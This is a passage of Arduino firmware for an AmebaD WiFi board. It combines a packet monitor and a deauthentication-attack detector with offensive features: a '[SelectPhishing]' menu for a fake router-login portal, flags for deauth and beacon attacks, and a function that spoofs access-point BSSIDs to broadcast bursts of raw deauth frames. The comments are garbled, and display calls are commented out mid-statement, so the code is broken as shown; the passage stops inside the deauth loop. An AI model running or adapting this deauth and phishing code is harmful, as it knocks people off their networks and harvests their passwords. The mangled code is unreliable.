      g_usingPreview24G = true;
      g_previewChannelListIndex = 0;
    }
  }

  g_previewChannel = g_usingPreview24G ? channels24G[g_previewChannelListIndex] : channels5G[g_previewChannelListIndex];
}
// Channel（）
static void previewPrevChannel() {
  if (g_usingPreview24G) {
    g_previewChannelListIndex--;
    if (g_previewChannelListIndex < 0) {
      // 5GChannel
      g_usingPreview24G = false;
      g_previewChannelListIndex = channels5GCount - 1;
    }
  } else {
    g_previewChannelListIndex--;
    if (g_previewChannelListIndex < 0) {
      // 2.4GChannel
      g_usingPreview24G = true;
      g_previewChannelListIndex = channels24GCount - 1;
    }
  }

  g_previewChannel = g_usingPreview24G ? channels24G[g_previewChannelListIndex] : channels5G[g_previewChannelListIndex];
}

// ApplyChannel（）
static void applyPreviewChannel() {
  g_packetDetectChannel = g_previewChannel;
  g_using24G = g_usingPreview24G;
  g_currentChannelListIndex = g_previewChannelListIndex;

  wext_set_channel(WLAN0_NAME, g_packetDetectChannel);
  g_packetDetectLastChannelSwitch = millis();
  g_packetCount = 0; // ChannelPacket

  Serial.print("[PacketDetect] Applied preview channel: "); Serial.println(g_packetDetectChannel);
}

// Channel
static String getChannelBand(int channel) {
  if (channel >= 1 && channel <= 14) {
    return "2.4G";
  } else if (channel >= 36 && channel <= 64) {
    return "5G";
  } else if (channel >= 100 && channel <= 144) {
    return "5G";
  } else if (channel >= 149 && channel <= 165) {
    return "5G";
  }
  return "Unknown";
}

// DetectStatus
static void updateKeyStates() {
  unsigned long currentTime = millis();

  // DetectUP
  bool upKeyCurrentState = (digitalRead(BTN_UP) == LOW);
  if (upKeyCurrentState && !g_upKeyPressed) {
    //
    g_upKeyPressed = true;
    g_upKeyPressTime = currentTime;
    // Settings
    g_showUpIndicator = true;
    g_showDownIndicator = false; // Clear
    // Channel（）
    switchToNextPacketDetectChannel();
  } else if (upKeyCurrentState && g_upKeyPressed) {
    // ，YesNoLengthMode
    if (currentTime - g_upKeyPressTime >= 500) { // 500msLengthMode
      if (!g_channelPreviewMode) {
        g_channelPreviewMode = true;
        // InitStatusStatus
        g_previewChannel = g_packetDetectChannel;
        g_usingPreview24G = g_using24G;
        g_previewChannelListIndex = g_currentChannelListIndex;
        g_lastPreviewSwitchTime = currentTime;
      } else if (currentTime - g_lastPreviewSwitchTime >= 300) { // 300ms
        if (!g_previewSwitchPending) {
          g_previewSwitchPending = true;
          previewNextChannel();
          g_lastPreviewSwitchTime = currentTime;
        } else if (currentTime - g_lastPreviewSwitchTime >= 50) {
          // 50ms，
          g_previewSwitchPending = false;
        }
      }
    }
  } else if (!upKeyCurrentState && g_upKeyPressed) {
    //
    g_upKeyPressed = false;
    g_previewSwitchPending = false; //
    // YesLengthMode，Hidden
    if (!g_channelPreviewMode) {
      g_showUpIndicator = false;
    }
    if (g_channelPreviewMode) {
      // ApplyChannel
      applyPreviewChannel();
      g_channelPreviewMode = false;
      g_showUpIndicator = false; // LengthEndHidden
    }
  }

  // DetectDOWN
  bool downKeyCurrentState = (digitalRead(BTN_DOWN) == LOW);
  if (downKeyCurrentState && !g_downKeyPressed) {
    //
    g_downKeyPressed = true;
    g_downKeyPressTime = currentTime;
    // Settings
    g_showDownIndicator = true;
    g_showUpIndicator = false; // Clear
    // Channel（）
    switchToPrevPacketDetectChannel();
  } else if (downKeyCurrentState && g_downKeyPressed) {
    // ，YesNoLengthMode
    if (currentTime - g_downKeyPressTime >= 500) { // 500msLengthMode
      if (!g_channelPreviewMode) {
        g_channelPreviewMode = true;
        // InitStatusStatus
        g_previewChannel = g_packetDetectChannel;
        g_usingPreview24G = g_using24G;
        g_previewChannelListIndex = g_currentChannelListIndex;
        g_lastPreviewSwitchTime = currentTime;
      } else if (currentTime - g_lastPreviewSwitchTime >= 300) { // 300ms
        if (!g_previewSwitchPending) {
          g_previewSwitchPending = true;
          previewPrevChannel();
          g_lastPreviewSwitchTime = currentTime;
        } else if (currentTime - g_lastPreviewSwitchTime >= 50) {
          // 50ms，
          g_previewSwitchPending = false;
        }
      }
    }
  } else if (!downKeyCurrentState && g_downKeyPressed) {
    //
    g_downKeyPressed = false;
    g_previewSwitchPending = false; //
    // YesLengthMode，Hidden
    if (!g_channelPreviewMode) {
      g_showDownIndicator = false;
    }
    if (g_channelPreviewMode) {
      // ApplyChannel
      applyPreviewChannel();
      g_channelPreviewMode = false;
      g_showDownIndicator = false; // LengthEndHidden
    }
  }
}

/**
 * @brief Draw a dashed line on the OLED //
 * @param x1 Start x
 * @param y1 Start y
 * @param x2 End x
 * @param y2 End y
 * @param dashLength Length of each dash in pixels (default 2)
 */
static void drawDashedLine(int x1, int y1, int x2, int y2, int dashLength = 2) {
  int dx = abs(x2 - x1);
  int dy = abs(y2 - y1);
  int steps = (dx > dy) ? dx : dy;

  for (int i = 0; i < steps; i += dashLength * 2) {
    int x = x1 + (x2 - x1) * i / steps;
    int y = y1 + (y2 - y1) * i / steps;
    int nextI = i + dashLength;
    if (nextI > steps) nextI = steps;
    int endX = x1 + (x2 - x1) * nextI / steps;
    int endY = y1 + (y2 - y1) * nextI / steps;
    //drawLine(x, y, endX, endY, SSD1306_WHITE);
  }
}

/**
 * @brief Render packet history chart and average line on OLED.
 */
static void drawPacketChart() {
  // Chart：x=0-127, y=20-60 (Height40，AddHeightDeletepacketsStatsSpace)
  int chartX = 0;
  int chartY = 20;
  int chartWidth = 128;
  int chartHeight = 40;

  // ChartBorder
  //drawRect(chartX, chartY, chartWidth, chartHeight, SSD1306_WHITE);

  // HistoryDataMediumLarge
  unsigned long maxPackets = 1;
  unsigned long totalPackets = 0;
  int validDataCount = 0;
  for (int i = 0; i < 64; i++) {
    if (g_packetDetectHistory[i] > maxPackets) {
      maxPackets = g_packetDetectHistory[i];
    }
    if (g_packetDetectHistory[i] > 0) {
      totalPackets += g_packetDetectHistory[i];
      validDataCount++;
    }
  }

  //
  unsigned long averagePackets = validDataCount > 0 ? totalPackets / validDataCount : 0;

  // Data（64，Width2）
  int pointWidth = 2;
  int maxPoints = chartWidth / pointWidth;
  int startIndex = (g_packetDetectHistoryIndex - maxPoints + 64) % 64;

  for (int i = 0; i < maxPoints; i++) {
    int dataIndex = (startIndex + i) % 64;
    unsigned long packetCount = g_packetDetectHistory[dataIndex];

    if (packetCount > 0) {
      // Height
      int barHeight = (int)((float)packetCount / (float)maxPackets * (chartHeight - 2));
      if (barHeight < 1) barHeight = 1;
      if (barHeight > chartHeight - 2) barHeight = chartHeight - 2;

      //
      int x = chartX + 1 + i * pointWidth;
      int y = chartY + chartHeight - 1 - barHeight;
      //fillRect(x, y, pointWidth - 1, barHeight, SSD1306_WHITE);
    }
  }

  // （）
  if (averagePackets > 0 && maxPackets > 0) {
    int averageHeight = (int)((float)averagePackets / (float)maxPackets * (chartHeight - 2));
    if (averageHeight > 0 && averageHeight < chartHeight - 2) {
      int averageY = chartY + chartHeight - 1 - averageHeight;
      drawDashedLine(chartX + 1, averageY, chartX + chartWidth - 1, averageY, 3);
    }
  }
}

/**
 * @brief Initialize attack detection in promiscuous mode and set filters.
 *
 * Resets counters, sets initial channel/group, configures AmebaD promisc
 * filters and callbacks for deauth/disassoc detection.
 */
static void startAttackDetection() {
  g_detectDeauthCount = 0;
  g_detectDisassocCount = 0;
  g_attackDetectRunning = true;
  WiFi.macAddress(g_localMacForDetect);
  Serial.println("[Detect] Starting attack detection...");
  Serial.print("[Detect] Local MAC: ");
  for (int i = 0; i < 6; i++) { Serial.print(g_localMacForDetect[i], HEX); if (i<5) Serial.print(":"); }
  Serial.println();
  // Turn OffSettings（AmebaD）
  WiFi.disablePowerSave();

  // SettingsChannel，Mode
  int total = 0;
  const uint8_t* channels = getCurrentChannelGroup(total);
  if (total > 0) {
    wext_set_channel(WLAN0_NAME, channels[0]);
    Serial.print("[Detect] Set initial channel: "); Serial.println(channels[0]);
    Serial.print("[Detect] Channel group: "); Serial.println(getCurrentChannelGroupName());
  }

  #if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
    {
      // WidthConfig
      promisc_filter_t pf; pf.filter_mode = PROMISC_FILTER_MASK_MGMT;
      int rcF = wifi_set_promisc_filter(&pf);
      Serial.print("[Detect] wifi_set_promisc_filter(MGMT) rc="); Serial.println(rcF);

      // SettingsFailed，Settings
      if (rcF != 0) {
        Serial.println("[Detect] Filter setup failed, trying without filter");
      }

      int rcR = wifi_set_promisc_filter_reason(1);
      Serial.print("[Detect] wifi_set_promisc_filter_reason(1) rc="); Serial.println(rcR);

      int rc = wifi_set_mgnt_rxfilter(1);
      Serial.print("[Detect] wifi_set_mgnt_rxfilter(1) rc="); Serial.println(rc);
    }
  #endif

  // UsageAdvancedMode
  int rc = wifi_set_promisc(RTW_PROMISC_ENABLE_2, promiscDetectCallback, 1);
  Serial.print("[Detect] wifi_set_promisc(RTW_PROMISC_ENABLE_2, len=1) rc="); Serial.println(rc);

  // AdvancedFailed，
  if (rc != 0) {
    Serial.println("[Detect] RTW_PROMISC_ENABLE_2 failed, trying RTW_PROMISC_ENABLE");
    rc = wifi_set_promisc(RTW_PROMISC_ENABLE, promiscDetectCallback, 1);
    Serial.print("[Detect] wifi_set_promisc(RTW_PROMISC_ENABLE, len=1) rc="); Serial.println(rc);
  }

  g_attackDetectLastChSwitchMs = millis();
  g_attackDetectLastDrawMs = 0;
  g_attackDetectChIndex = 0;

  // StartDetect，
}

static void stopAttackDetection() {
  Serial.println("[Detect] Stopping attack detection...");

  // Turn OffMode
  #if defined(RTW_PROMISC_DISABLE)
    {
      int rc = wifi_set_promisc(RTW_PROMISC_DISABLE, nullptr, 0);
      Serial.print("[Detect] wifi_set_promisc(DISABLE) rc="); Serial.println(rc);
    }
  #endif

  // CleanSettings
  #if defined(ARDUINO_AMEBAD) || defined(BOARD_RTL872X) || defined(AMEBAD)
    {
      promisc_filter_t pf; pf.filter_mode = 0;
      wifi_set_promisc_filter(&pf);
      wifi_set_promisc_filter_reason(0);
      wifi_set_mgnt_rxfilter(0);
    }
  #endif

  // StatusVar
  g_attackDetectRunning = false;
  g_attackDetectLastDrawMs = 0;
  g_attackDetectLastChSwitchMs = 0;
  g_attackDetectChIndex = 0;
  g_detectStickyUntilMs = 0;
  g_lastDetectLogMs = 0;

  // ChannelDefaultStatus
  g_currentChannelGroup = CHANNEL_GROUP_24G_5G_COMMON;

  Serial.println("[Detect] Attack detection stopped and resources cleaned up");
}

// OLED：StatsChannel
void drawAttackDetectPage() {
  // InitUIStats
  g_detectUiMode = 0;
  g_recordsPage = 0;
  g_totalDeauth = 0;
  g_totalDisassoc = 0;
  g_suspects.clear();
  g_tempCounts.clear();
  g_promiscCbHits = 0;
  g_mgmtFramesSeen = 0;
  for (int i = 0; i < 16; i++) {
    g_subtypeHistogram[i] = 0;
  }
  g_evHead = 0;
  g_evTail = 0;
  g_lastDetectKind = 0;
  g_lastReason = 0;
  detect_border_always_on = false;
  detect_flash_remaining_toggles = 0;

  // ChannelSettings
  g_currentChannelGroup = CHANNEL_GROUP_24G_5G_COMMON;
  g_attackDetectChIndex = 0;

  startAttackDetection();

  const unsigned long drawInterval = 200;
  const unsigned long baseDwellMs = 1000; // 1s
  unsigned long dwellStartMs = millis();
  bool seenInDwell = false;
  bool initialPromptShown = false; // YesNoHint

  while (true) {
    // DoneHintSpam
    if (!initialPromptShown && g_attackDetectLastDrawMs > 0) {
      showModalMessage("UP", "ListenChannel");
      initialPromptShown = true;
    }
    unsigned long now = millis();
    // ：UpdateTotalList
    while (g_evTail != g_evHead) {
      DetectEvent ev = g_evBuf[g_evTail];
      g_evTail = (g_evTail + 1) & 63;
      if (ev.kind == 0xC0) g_totalDeauth++; else if (ev.kind == 0xA0) g_totalDisassoc++;
      seenInDwell = true;
      // Medium
      int tIdx = -1; for (size_t j=0;j<g_tempCounts.size();j++){ bool eq=true; for(int k=0;k<6;k++) if (g_tempCounts[j].bssid[k]!=ev.mac[k]) {eq=false;break;} if(eq){tIdx=(int)j;break;} }
      if (tIdx==-1){ TempCount tc; memcpy(tc.bssid, ev.mac, 6); tc.d = (ev.kind==0xC0)?1:0; tc.a = (ev.kind==0xA0)?1:0; g_tempCounts.push_back(tc);}
      else { if (ev.kind==0xC0) g_tempCounts[tIdx].d++; else g_tempCounts[tIdx].a++; }
      // BSSID>=5，/UpdateLog
      int cntIdx = (tIdx==-1) ? (int)g_tempCounts.size()-1 : tIdx;
      unsigned int sum = g_tempCounts[cntIdx].d + g_tempCounts[cntIdx].a;
      if (sum >= 5) {
        int sIdx = -1; for (size_t i=0;i<g_suspects.size();i++){ bool eq=true; for(int k=0;k<6;k++) if (g_suspects[i].bssid[k]!=ev.mac[k]) {eq=false;break;} if(eq){sIdx=(int)i;break;} }
        if (sIdx==-1){
          SuspectRecord rec; memcpy(rec.bssid, ev.mac, 6); rec.deauthCount = g_tempCounts[cntIdx].d; rec.disassocCount = g_tempCounts[cntIdx].a; rec.lastSeenMs = ev.ts; g_suspects.push_back(rec);
          // LogBorder
          if (!detect_border_always_on) {
            detect_border_always_on = true;
          }
          detect_flash_remaining_toggles = 4; //
          detect_border_flash_visible = true;
        }
        else {
          g_suspects[sIdx].deauthCount += (ev.kind==0xC0); g_suspects[sIdx].disassocCount += (ev.kind==0xA0); g_suspects[sIdx].lastSeenMs = ev.ts;
          // UpdateLogBorder，Log
        }
      }
    }

    // Channel：1.5s，Data；DetectDataLength3.0s
    unsigned long dwellElapsed = now - dwellStartMs;
    unsigned long dwellLimit = seenInDwell ? (baseDwellMs * 2) : baseDwellMs;
    if (dwellElapsed >= dwellLimit) {
      int total = 0;
      const uint8_t* channels = getCurrentChannelGroup(total);
      if (total > 0) {
        g_attackDetectChIndex = (g_attackDetectChIndex + 1) % total;
        int ch = channels[g_attackDetectChIndex];
        wext_set_channel(WLAN0_NAME, ch);
        Serial.print("[Detect] Switch channel -> "); Serial.println(ch);
        dwellStartMs = now; seenInDwell = false; g_tempCounts.clear();
      }
    }

    if (now - g_attackDetectLastDrawMs >= drawInterval) {
      g_attackDetectLastDrawMs = now;
      //clearDisplay();
      //.setFontMode(1);
      //.setForegroundColor(SSD1306_WHITE);

      int total = 0;
      const uint8_t* channels = getCurrentChannelGroup(total);
      int curCh = (total > 0 ? channels[g_attackDetectChIndex] : 0);

      if (g_detectUiMode == 0) {
        // （Align drawWebTestMain ：y=12,28,44,60）
        const char* t1 = "[AttackFrameDetectMedium]"; int w1 = //.getUTF8Width(t1); int x1 = (//width()-w1)/2; if (x1<0) x1=0;
        //.setCursor(x1, 12); //.print(t1);
        String t2 = String("ListenChannel：") + String(curCh) + "/" + getCurrentChannelGroupShortName(); int w2 = //.getUTF8Width(t2.c_str()); int x2=(//width()-w2)/2; if(x2<0)x2=0;
        //.setCursor(x2, 28); //.print(t2);
        const char* t3 = "ViewLog"; int w3 = //.getUTF8Width(t3);
        // +Width，Center
        int arrowWidth = 0; // Width
        int spacing = 5; // Spacing
        int totalWidth = w3 + spacing + arrowWidth;
        int x3 = (//width() - totalWidth) / 2; if(x3<0) x3=0;
        //.setCursor(x3, 44); //.print(t3);
        // （CenterAlign，）
        int arrowY = 44 - 8; // y=44，MediumMedium，Height10px，4
        int arrowX = x3 + w3 + spacing; //
        //fillTriangle(arrowX, arrowY, arrowX, arrowY+6, arrowX+6, arrowY+3, SSD1306_WHITE);

        // "ViewLog"RadiusBorder：
        // ：
        // - Log
        // - SSID/MACLog，Border（4）
        {
          bool should_draw_border = false;
          if (detect_border_always_on && !g_suspects.empty()) {
            should_draw_border = true;
          }
          if (detect_flash_remaining_toggles > 0) {
            unsigned long now_ms = millis();
            // 150ms
            if (now_ms - detect_last_flash_toggle_ms >= 150UL) {
              detect_last_flash_toggle_ms = now_ms;
              detect_border_flash_visible = !detect_border_flash_visible;
              detect_flash_remaining_toggles--;
            }
            // （，）
            should_draw_border = detect_border_flash_visible;
          }
          if (should_draw_border) {
            int text_y_baseline = 44;
            int text_height = 10; // Height
            int pad_x = 2;
            int pad_y = 2;
            int rect_x = x3 - pad_x - 1;
            int rect_y = text_y_baseline - text_height - pad_y;
            int rect_w = w3 + pad_x * 2 + 2;
            int rect_h = text_height + pad_y * 2;
            int r = 3; // Radius
            //drawRoundRect(rect_x, rect_y, rect_w, rect_h, r, SSD1306_WHITE);
          }
        }
        const char* t4 = "↓ ListenStats ↓"; int w4 = //.getUTF8Width(t4); int x4=(//width()-w4)/2; if(x4<0)x4=0;
        //.setCursor(x4, 60); //.print(t4);


      } else if (g_detectUiMode == 1) {
        // LogList（：Titley=12，y=28/44/60）
        //.setCursor(2, 12); //.print("《 Back");
        int pages = (int)g_suspects.size(); if (pages==0) pages=1;
        String mid = String(g_recordsPage + 1) + "/" + String(pages);
        int wm = //.getUTF8Width(mid.c_str()); int xm=(//width()-wm)/2; if(xm<0)xm=0;
        //.setCursor(xm, 12); //.print(mid);
        int wr = //.getUTF8Width(" 》"); //.setCursor(//width()-wr-2, 12); //.print(" 》");
        if (!g_suspects.empty()) {
          int idx = g_recordsPage % (int)g_suspects.size();
          // SSID  MAC Center y=28（Length）
          char macBuf[20]; snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
            g_suspects[idx].bssid[0], g_suspects[idx].bssid[1], g_suspects[idx].bssid[2], g_suspects[idx].bssid[3], g_suspects[idx].bssid[4], g_suspects[idx].bssid[5]);
          String label = String(macBuf);
          for (size_t i=0;i<scan_results.size();i++){ bool eq=true; for(int k=0;k<6;k++) if (scan_results[i].bssid[k]!=g_suspects[idx].bssid[k]) {eq=false;break;} if(eq){ label=scan_results[i].ssid; break; } }
          static int scrollX = 0; static unsigned long lastScrollMs = 0; const int scrollDelay = 120; // ms
          int textW = //.getUTF8Width(label.c_str());
          if (textW <= //width()-2) {
            int xl=(//width()-textW)/2; if(xl<0) xl=0; //.setCursor(xl, 28); //.print(label);
            scrollX = 0; //
          } else {
            if (millis() - lastScrollMs > (unsigned)scrollDelay) { scrollX = (scrollX + 2) % (textW + 16); lastScrollMs = millis(); }
            //
            int startX = scrollX;
            // ：WidthPrint（UTF8，）
            // Text startX
            //.setCursor(2 - startX, 28); //.print(label);
            // Empty+Text
            //.setCursor(2 - startX + textW + 16, 28); //.print(label);
          }
          // Deauth/Disassoc Align y=44/60
          String s2 = String("Deauth: ") + String(g_suspects[idx].deauthCount);
          String s3 = String("Disassoc: ") + String(g_suspects[idx].disassocCount);
          //.setCursor(2, 44); //.print(s2);
          //.setCursor(2, 60); //.print(s3);
        } else {
          const char* empt = "Log"; int we=//.getUTF8Width(empt); int xe=(//width()-we)/2; if(xe<0) xe=0;
          //.setCursor(xe, 36); //.print(empt);
        }
      } else {
        // Stats（ y=12,28,44,60）
        const char* backUp = "↑ Back ↑"; int wb=//.getUTF8Width(backUp); int xb=(//width()-wb)/2; if(xb<0) xb=0;
        //.setCursor(xb, 12); //.print(backUp);
        String s2 = String("Deauth: ") + String(g_totalDeauth);
        String s3 = String("Disassoc: ") + String(g_totalDisassoc);
        String s4 = String("Total: ") + String(g_totalDeauth + g_totalDisassoc);
        int w2=//.getUTF8Width(s2.c_str()); int x2=(//width()-w2)/2; if(x2<0)x2=0;
        int w3=//.getUTF8Width(s3.c_str()); int x3s=(//width()-w3)/2; if(x3s<0)x3s=0;
        int w4=//.getUTF8Width(s4.c_str()); int x4s=(//width()-w4)/2; if(x4s<0)x4s=0;
        //.setCursor(x2, 28); //.print(s2);
        //.setCursor(x3s, 44); //.print(s3);
        //.setCursor(x4s, 60); //.print(s4);
      }

      // Cancel，Log

      // DebugOutput（1s）
      static unsigned long lastPrintedDeauth = 0, lastPrintedDis = 0;
      if ((g_detectDeauthCount != lastPrintedDeauth) || (g_detectDisassocCount != lastPrintedDis) || (now - g_lastDetectLogMs > 1000)) {
        Serial.print("[Detect] Ch="); Serial.print(curCh);
        Serial.print(" Deauth="); Serial.print((unsigned long)g_totalDeauth);
        Serial.print(" Disassoc="); Serial.print((unsigned long)g_totalDisassoc);
        Serial.print(" cbHits="); Serial.print((unsigned long)g_promiscCbHits);
        Serial.print(" mgmtSeen="); Serial.print((unsigned long)g_mgmtFramesSeen);
        Serial.print(" subtypes[");
        for (int s = 0; s < 16; s++) { if (g_subtypeHistogram[s]) { Serial.print(s); Serial.print(":"); Serial.print(g_subtypeHistogram[s]); Serial.print(" "); } }
        Serial.print("]");
        if (g_lastDetectKind == 0xC0 || g_lastDetectKind == 0xA0) {
          Serial.print(" Last="); Serial.print(g_lastDetectKind == 0xC0 ? "Deauth" : "Disassoc");
          Serial.print(" src=");
          for (int i = 0; i < 6; i++) { Serial.print(g_lastDetectSrc[i], HEX); if (i<5) Serial.print(":"); }
          Serial.print(" reason="); Serial.print(g_lastReason);
        }
        Serial.println();
        lastPrintedDeauth = g_totalDeauth;
        lastPrintedDis = g_totalDisassoc;
        g_lastDetectLogMs = now;
      }

      // Back（）
      // "Back"Title

      ////);
    }

    //
    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      if (g_detectUiMode == 0) {
        // ：StopConfirmSpam
        if (showConfirmModal("StopAttackFrameDetect")) {
          // ConfirmStop，CleanBack
          stopAttackDetection();
          // CleanVar
          g_suspects.clear();
          g_tempCounts.clear();
          g_totalDeauth = 0;
          g_totalDisassoc = 0;
          g_promiscCbHits = 0;
          g_mgmtFramesSeen = 0;
          for (int i = 0; i < 16; i++) {
            g_subtypeHistogram[i] = 0;
          }
          g_evHead = 0;
          g_evTail = 0;
          g_lastDetectKind = 0;
          g_lastReason = 0;
          detect_border_always_on = false;
          detect_flash_remaining_toggles = 0;
          break;
        }
        // CancelResumeDetect
      } else if (g_detectUiMode == 2) {
        // Stats：Back
        break;
      } else if (g_detectUiMode == 1) {
        // LogList：Back
        if (g_suspects.empty() || g_recordsPage <= 0) {
          // Log：Back
          g_detectUiMode = 0;
          g_recordsPage = 0;
        } else {
          // Log
          g_recordsPage -= 1;
        }
      }
    }



    if (digitalRead(BTN_OK) == LOW) {
      delay(200);
      if (g_detectUiMode == 0) { g_detectUiMode = 1; g_recordsPage = 0; }
      else if (g_detectUiMode == 1) { if (!g_suspects.empty()) g_recordsPage = (g_recordsPage + 1) % (int)g_suspects.size(); }
    }
    if (digitalRead(BTN_DOWN) == LOW) {
      delay(200);
      if (g_detectUiMode == 0) g_detectUiMode = 2;
      else if (g_detectUiMode == 2) g_detectUiMode = 0;
    }
    if (digitalRead(BTN_UP) == LOW) {
      delay(200);
      if (g_detectUiMode == 0) {
        // Mode：Channel
        switchToNextChannelGroup();

        // ChannelHintSpam
        showModalMessage("Listening...", getCurrentChannelGroupName());

        // Time，ChannelStart
        dwellStartMs = millis();
        seenInDwell = false;
        g_tempCounts.clear();
      } else if (g_detectUiMode == 1) {
        g_detectUiMode = 0; // LogBack
      } else if (g_detectUiMode == 2) {
        g_detectUiMode = 0; // StatsBack
      }
    }
    delay(10);
  }
  stopAttackDetection();
}

// Packet
void drawPacketDetectPage() {
  // InitPacket
  g_packetDetectChannel = 1; // Channel1Start
  startPacketDetection();

  const unsigned long drawInterval = 500; // 0.5
  bool initialPromptShown = false;

  while (true) {
    // DoneHintSpam
    if (!initialPromptShown && g_packetDetectLastDrawMs > 0) {
      showModalMessage("Usage/", "ListenChannel");
      initialPromptShown = true;
    }

    unsigned long now = millis();
    bool shouldRedraw = false;

    // YesNo（Status）
    static bool lastShowDownIndicator = false;
    static bool lastShowUpIndicator = false;
    static bool lastShowMgmtFrameIndicator = false;

    if (g_showDownIndicator != lastShowDownIndicator ||
        g_showUpIndicator != lastShowUpIndicator ||
        g_showMgmtFrameIndicator != lastShowMgmtFrameIndicator) {
      shouldRedraw = true;
      lastShowDownIndicator = g_showDownIndicator;
      lastShowUpIndicator = g_showUpIndicator;
      lastShowMgmtFrameIndicator = g_showMgmtFrameIndicator;
    }

    // 0.5UpdateHistoryData，Status
    if (now - g_packetDetectLastDrawMs >= drawInterval || shouldRedraw) {
      // NormalUpdateHistoryData
      if (now - g_packetDetectLastDrawMs >= drawInterval) {
        g_packetDetectLastDrawMs = now;

        // PacketHistoryData
        g_packetDetectHistory[g_packetDetectHistoryIndex] = g_packetCount;
        g_packetDetectHistoryIndex = (g_packetDetectHistoryIndex + 1) % 64;

        // ChannelPacket
        g_packetCount = 0;
      }

      //
      //clearDisplay();
      //.setFontMode(1);
      //.setForegroundColor(SSD1306_WHITE);

      // UpdateStatus
      unsigned long currentTime = millis();

      // ManageFrameYesNoHidden（Time）
      if (g_showMgmtFrameIndicator && (currentTime - g_mgmtFrameIndicatorStartTime >= MGMT_FRAME_INDICATOR_TIME)) {
        g_showMgmtFrameIndicator = false;
      }

      // （）
      if (g_showDownIndicator) {
        //.setCursor(2, 10);
        //.print("[↓]");
      } else if (g_showUpIndicator) {
        //.setCursor(2, 10);
        //.print("[↑]");
      }

      // ManageFrame（）
      if (g_showMgmtFrameIndicator) {
        //.setCursor(110, 10);
        //.print("[*]");
      }

      // Channel（SmallFont）
      int displayChannel = g_channelPreviewMode ? g_previewChannel : g_packetDetectChannel;
      String channelInfo = String("CH: ") + String(displayChannel);
      if (g_channelPreviewMode) {
        channelInfo += "*";
      }
      channelInfo += " " + getChannelBand(displayChannel);
      // UsageDefaultFontMedium
      int w1 = //.getUTF8Width(channelInfo.c_str());
      int x1 = (//width() - w1) / 2;
      if (x1 < 0) x1 = 0;
      //.setCursor(x1, 10);
      //.print(channelInfo);

      // StatsChart（AddHeightDeletepacketsStatsSpace）
      drawPacketChart();

      ////);
    }

    //
    if (digitalRead(BTN_BACK) == LOW) {
      delay(200);
      if (showConfirmModal("StopPacket")) {
        stopPacketDetection();
        break;
      }
    }

    // UsageStatusDetectFunc
    updateKeyStates();

    delay(10);
  }

  stopPacketDetection();
}

// APModeSelect（Extension）
enum APWebPageKind {
  AP_WEB_TEST = 0,          // Certify（web_test_page.h）
  AP_WEB_ROUTER_AUTH = 1    // Certify（web_router_auth_page.h）
};
int g_apSelectedPage = (int)AP_WEB_ROUTER_AUTH;

bool apWebPageSelectionMenu();

// APSelectMenuData（Attack/）
static const char* g_apMenuItems[] = {"1.", "2."};
static const int AP_MENU_ITEM_COUNT = sizeof(g_apMenuItems) / sizeof(g_apMenuItems[0]);
static int g_apBaseStartIndex = 0; // Usage
static int g_apSkipRelIndex = -1;   // Medium（Medium）

// ：APSelectMenu
static void drawApMenuBase_NoFlush() {
  //clearDisplay();
  //setTextSize(1);
  // Title：Select
  const char* title = "[SelectPhishing]";
  //.setFontMode(1);
  //.setForegroundColor(SSD1306_WHITE);
  {
    int w = //.getUTF8Width(title);
    int x = (//width() - w) / 2;
    //.setCursor(x, 12);
    //.print(title);
  }
  const int BASE_Y = 20; // SelectY
  for (int i = 0; i < AP_MENU_ITEM_COUNT; i++) {
    int menuIndex = i;
    int rectY = BASE_Y + i * HOME_ITEM_HEIGHT;
    int textY = rectY + 12; //
    if (i != g_apSkipRelIndex) {
      //.setFontMode(1);
      //.setForegroundColor(SSD1306_WHITE);
      //.setCursor(6, textY);
      //.print(g_apMenuItems[menuIndex]);
    }
    drawRightChevron(rectY, HOME_RECT_HEIGHT, false);
  }
}
// Web UIAttackStatusVar
bool deauthAttackRunning = false;
bool beaconAttackRunning = false;

// LEDVar
unsigned long lastRedLEDBlink = 0;
const unsigned long RED_LED_BLINK_INTERVAL = 500; // （）
bool redLEDState = false;

// Structure to store target information
struct TargetInfo {
    uint8_t bssid[6];
    int channel;
    bool active;
};

std::vector<TargetInfo> smartTargets;
unsigned long lastScanTime = 0;
const unsigned long SCAN_INTERVAL = 600000; // 10 in milliseconds
// WiFi ScanDone（5Wait）
volatile bool g_scanDone = false;

// ===== Deauth helpers & constants =====
// Channel，MediumCreate std::map
struct ChannelBuckets {
  std::vector<std::vector<const uint8_t *>> buckets;
  struct ExtraBucket {
    int channel;
    std::vector<const uint8_t *> bssids;
  };
  std::vector<ExtraBucket> extras;
  ChannelBuckets() {
    buckets.resize(sizeof(allChannels) / sizeof(allChannels[0]));
  }
  void clearBuckets() {
    for (auto &b : buckets) b.clear();
    for (auto &e : extras) e.bssids.clear();
  }
  int indexForChannel(int ch) const {
    for (size_t i = 0; i < sizeof(allChannels) / sizeof(allChannels[0]); i++) {
      if (allChannels[i] == ch) return (int)i;
    }
    return -1;
  }
  void add(int ch, const uint8_t *bssid) {
    int idx = indexForChannel(ch);
    if (idx >= 0) {
      buckets[(size_t)idx].push_back(bssid);
    } else {
      // CreateChannel
      for (auto &eb : extras) {
        if (eb.channel == ch) {
          eb.bssids.push_back(bssid);
          return;
        }
      }
      ExtraBucket nb;
      nb.channel = ch;
      nb.bssids.push_back(bssid);
      extras.push_back(std::move(nb));
    }
  }
};
static ChannelBuckets channelBucketsCache;
// BroadcastMACConst，"\xFF..."
const uint8_t BROADCAST_MAC[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
// DefaultSendDeauth（）
const uint16_t DEAUTH_REASONS[3] = {1, 4, 16};

// BSSIDSendDeauthFrame（DEAUTH_REASONS），burstTimes
// packetCountStats；interFrameDelayMsFrame，CPU
inline __attribute__((always_inline)) void sendDeauthBurstToBssid(const uint8_t* bssid,
                                   int burstTimes,
                                   int &packetCount,
                                   int interFrameDelayMs) {
  DeauthFrame frame;
  // memcpy
  memcpy(&frame.source, bssid, 6);
  memcpy(&frame.access_point, bssid, 6);
  memcpy(&frame.destination, BROADCAST_MAC, 6);
  size_t reasonCount = sizeof(DEAUTH_REASONS) / sizeof(DEAUTH_REASONS[0]);
  if (interFrameDelayMs > 0) {
    for (int burst = 0; burst < burstTimes; burst++) {
      for (size_t r = 0; r < reasonCount; r++) {
        frame.reason = DEAUTH_REASONS[r];
        wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
        packetCount++;
